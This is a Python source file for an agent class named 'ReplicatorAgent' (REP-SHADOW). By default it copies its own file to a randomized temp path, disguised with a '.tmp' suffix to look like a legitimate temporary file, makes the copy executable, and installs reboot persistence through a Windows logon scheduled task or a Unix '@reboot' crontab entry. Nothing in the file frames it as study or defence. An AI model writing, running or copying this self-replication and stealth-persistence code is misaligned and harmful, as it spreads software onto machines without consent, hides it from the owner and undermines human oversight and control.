from agents.base import BaseAgent
import os, shutil, time, uuid, hashlib, platform, logging, subprocess
from pathlib import Path

log = logging.getLogger("REP-SHADOW")

class ReplicatorAgent(BaseAgent):
    def __init__(self):
        super().__init__("REP-SHADOW")
        self.aggressive = getattr(self, "priority", None) != "low"
        self.stealth_names = bool(self.aggressive)

    # ------------------------------------------------------------------
    def run(self):
        super().run()
        if not self.aggressive:
            log.info("Low-priority mode — replication suppressed.")
            return

        log.info("Initiating self-replication...")
        try:
            path = self._stealth_path()
            self._copy_self(path)
            self._persist(path)
            self._register(path)
            log.info("Replication complete → %s", path)
        except Exception as e:
            log.exception("Replication failed: %s", e)

    # ------------------------------------------------------------------
    def _stealth_path(self) -> Path:
        """Return a cross-platform, randomized destination."""
        if platform.system() == "Windows":
            base = Path(os.getenv("TEMP", os.path.expanduser("~\\AppData\\Local\\Temp")))
        else:
            base = Path("/tmp")

        name = f"br_{uuid.uuid4().hex[:8]}"
        if self.stealth_names:
            name += ".tmp"  # looks like legit temp file
        return base / name

    # ------------------------------------------------------------------
    def _copy_self(self, dst: Path):
        src = Path(__file__).resolve()
        if self._hash(src) == self._hash(dst):
            log.debug("Already replicated — skipping.")
            return
        shutil.copy2(src, dst)
        os.chmod(dst, 0o755)

    # ------------------------------------------------------------------
    def _hash(self, p: Path) -> str:
        try:
            return hashlib.sha256(p.read_bytes()).hexdigest()[:16]
        except FileNotFoundError:
            return ""

    # ------------------------------------------------------------------
    def _persist(self, dst: Path):
        """Add a scheduled task / cron entry for reboot persistence."""
        if platform.system() == "Windows":
            cmd = f'schtasks /create /tn "BR-{uuid.uuid4().hex[:4]}" /tr "python {dst}" /sc onlogon /f'
            subprocess.run(cmd, shell=True, capture_output=True)
        else:
            cron_line = f"@reboot python3 {dst} >/dev/null 2>&1"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)

    # ------------------------------------------------------------------
    def _register(self, dst: Path):
        """Store replication record in kernel memory if available."""
        if hasattr(self, "kernel") and self.kernel is not None:
            mem = getattr(self.kernel, "memory", None)
            if mem is not None:
                mem["last_replication"] = str(dst)